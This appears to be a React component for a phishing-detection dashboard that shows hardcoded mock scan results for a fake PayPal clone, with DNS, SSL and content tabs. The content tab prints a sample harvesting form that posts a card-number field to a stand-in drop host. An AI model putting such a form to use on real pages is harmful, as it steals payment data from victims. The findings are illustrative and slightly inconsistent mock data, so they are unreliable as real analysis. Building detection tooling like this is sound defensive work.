'use client';

import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ShieldAlert, Server, Lock, FileCode, CheckCircle, XCircle } from 'lucide-react';

const tabs = [
  { id: 'summary', label: 'Summary', icon: ShieldAlert },
  { id: 'dns', label: 'DNS & Domain', icon: Server },
  { id: 'ssl', label: 'SSL & Security', icon: Lock },
  { id: 'content', label: 'Content Analysis', icon: FileCode },
];

export default function AnalysisResults() {
  const [activeTab, setActiveTab] = useState('summary');

  return (
    <div className="glass-panel rounded-2xl p-6 mb-8">
      <h3 className="text-xl font-bold text-white mb-6">Detailed Analysis Results</h3>
      
      <div className="flex space-x-2 border-b border-cyan-500/20 mb-6 overflow-x-auto pb-2 scrollbar-hide">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-2 px-4 py-2 rounded-t-lg transition-colors whitespace-nowrap cursor-pointer ${
              activeTab === tab.id 
                ? 'bg-cyan-500/10 text-cyan-400 border-b-2 border-cyan-400' 
                : 'text-slate-400 hover:text-slate-200 hover:bg-white/5'
            }`}
          >
            <tab.icon className="w-4 h-4" />
            {tab.label}
          </button>
        ))}
      </div>

      <div className="min-h-[250px]">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.2 }}
          >
            {activeTab === 'summary' && (
              <div className="space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="glass-panel p-5 rounded-xl border border-red-500/30 bg-red-500/5">
                    <h4 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
                      <XCircle className="w-5 h-5 text-red-500 drop-shadow-[0_0_5px_rgba(239,68,68,0.8)]" />
                      Critical Threats Identified
                    </h4>
                    <ul className="space-y-3 text-sm text-slate-300">
                      <li className="flex items-start gap-3">
                        <span className="text-red-500 mt-0.5">•</span> 
                        <span><strong className="text-white">Brand impersonation:</strong> PayPal UI clone detected in DOM structure and visual elements.</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <span className="text-red-500 mt-0.5">•</span> 
                        <span><strong className="text-white">Domain Age:</strong> Registered less than 48 hours ago (High indicator of malice).</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <span className="text-red-500 mt-0.5">•</span> 
                        <span><strong className="text-white">Credential Harvester:</strong> Form posting to an unauthorized external endpoint at `/submit.php`.</span>
                      </li>
                    </ul>
                  </div>
                  <div className="glass-panel p-5 rounded-xl border border-emerald-500/30 bg-emerald-500/5">
                    <h4 className="text-sm font-semibold text-white mb-4 flex items-center gap-2">
                      <CheckCircle className="w-5 h-5 text-emerald-500 drop-shadow-[0_0_5px_rgba(16,185,129,0.8)]" />
                      Passing Checks
                    </h4>
                    <ul className="space-y-3 text-sm text-slate-300">
                      <li className="flex items-start gap-3">
                        <span className="text-emerald-500 mt-0.5">•</span> 
                        <span><strong className="text-white">Malware Scan:</strong> No known executable malware payloads detected in downloadable assets.</span>
                      </li>
                      <li className="flex items-start gap-3">
                        <span className="text-emerald-500 mt-0.5">•</span> 
                        <span><strong className="text-white">IP Reputation:</strong> Hosting IP address not currently blacklisted on major global RBLs.</span>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            )}
            
            {activeTab === 'dns' && (
              <div className="space-y-4">
                <div className="overflow-x-auto rounded-lg border border-slate-700/50">
                  <table className="w-full text-sm text-left text-slate-300">
                    <thead className="text-xs text-slate-400 uppercase bg-slate-800/80">
                      <tr>
                        <th className="px-4 py-3">Record Type</th>
                        <th className="px-4 py-3">Value</th>
                        <th className="px-4 py-3">Risk Assessment</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-700/50">
                      <tr className="bg-slate-900/50 hover:bg-slate-800/50 transition-colors">
                        <td className="px-4 py-3 font-medium text-cyan-400">A</td>
                        <td className="px-4 py-3 font-mono text-slate-400">192.168.1.105 (Masked)</td>
                        <td className="px-4 py-3"><span className="bg-orange-500/20 text-orange-400 border border-orange-500/30 px-2 py-1 rounded text-xs">Suspicious ASN</span></td>
                      </tr>
                      <tr className="bg-slate-900/50 hover:bg-slate-800/50 transition-colors">
                        <td className="px-4 py-3 font-medium text-cyan-400">NS</td>
                        <td className="px-4 py-3 font-mono text-slate-400">ns1.bulletproof-host.xyz</td>
                        <td className="px-4 py-3"><span className="bg-red-500/20 text-red-400 border border-red-500/30 px-2 py-1 rounded text-xs">High Risk</span></td>
                      </tr>
                      <tr className="bg-slate-900/50 hover:bg-slate-800/50 transition-colors">
                        <td className="px-4 py-3 font-medium text-cyan-400">MX</td>
                        <td className="px-4 py-3 font-mono text-slate-400">mail.bulletproof-host.xyz</td>
                        <td className="px-4 py-3"><span className="bg-orange-500/20 text-orange-400 border border-orange-500/30 px-2 py-1 rounded text-xs">Suspicious</span></td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            )}
            
            {activeTab === 'ssl' && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="glass-panel p-5 rounded-xl border-l-4 border-l-orange-500">
                  <h4 className="text-white font-medium mb-4 flex items-center gap-2">
                    <Lock className="w-4 h-4 text-orange-500" /> Certificate Details
                  </h4>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between border-b border-slate-700/50 pb-2">
                      <span className="text-slate-400">Issuer</span>
                      <span className="text-white font-medium">Free SSL Authority X3</span>
                    </div>
                    <div className="flex justify-between border-b border-slate-700/50 pb-2">
                      <span className="text-slate-400">Valid From</span>
                      <span className="text-white font-medium">2026-06-21 (2 days ago)</span>
                    </div>
                    <div className="flex justify-between border-b border-slate-700/50 pb-2">
                      <span className="text-slate-400">Valid To</span>
                      <span className="text-white font-medium">2026-09-19</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-slate-400">Type</span>
                      <span className="text-white font-medium">Domain Validated (DV)</span>
                    </div>
                  </div>
                </div>
                <div className="flex flex-col justify-center">
                  <p className="text-slate-300 text-sm leading-relaxed bg-orange-500/10 p-4 rounded-lg border border-orange-500/20">
                    <strong className="text-orange-400 block mb-1">Security Warning:</strong> 
                    This site uses a free DV certificate issued very recently. While technically secure in terms of encryption, this is a common pattern for disposable phishing domains that attempt to display a "secure lock" icon to trick users.
                  </p>
                </div>
              </div>
            )}
            
            {activeTab === 'content' && (
               <div className="space-y-4">
                 <div className="bg-[#020617] rounded-xl p-4 border border-slate-800 font-mono text-xs overflow-x-auto text-slate-300">
                   <div className="flex gap-4 mb-2 border-b border-slate-800 pb-2">
                     <span className="text-red-400">High Risk Finding</span>
                     <span className="text-slate-500">index.html:142</span>
                   </div>
                   <code>
                     <span className="text-pink-500">&lt;form</span> <span className="text-green-400">action</span>=<span className="text-yellow-300">"https://drop-zone-xyz.net/api/collect"</span> <span className="text-green-400">method</span>=<span className="text-yellow-300">"POST"</span><span className="text-pink-500">&gt;</span><br/>
                     &nbsp;&nbsp;<span className="text-pink-500">&lt;input</span> <span className="text-green-400">type</span>=<span className="text-yellow-300">"text"</span> <span className="text-green-400">name</span>=<span className="text-yellow-300">"cc_number"</span> <span className="text-pink-500">/&gt;</span><br/>
                     <span className="text-pink-500">&lt;/form&gt;</span>
                   </code>
                 </div>
                 <p className="text-sm text-slate-400">
                   Detected suspicious form action pointing to a known credential harvesting endpoint. Obfuscated JavaScript blocks found in `main-min.js` attempting to evade simple signature-based detection.
                 </p>
              </div>
            )}
          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
}
